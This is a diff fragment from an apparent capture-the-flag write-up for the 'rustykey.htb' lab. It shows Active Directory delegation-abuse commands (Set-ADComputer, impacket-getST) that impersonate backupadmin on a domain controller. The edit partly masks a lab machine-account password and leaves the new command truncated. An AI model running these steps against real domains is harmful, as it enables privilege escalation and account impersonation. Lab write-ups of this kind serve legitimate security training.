@@ -211,7 +211,7 @@ Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
 ```
 
 ```bash
-impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip $ip -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
+impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip $ip -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rus<pass>
 ```
 
 ```bash
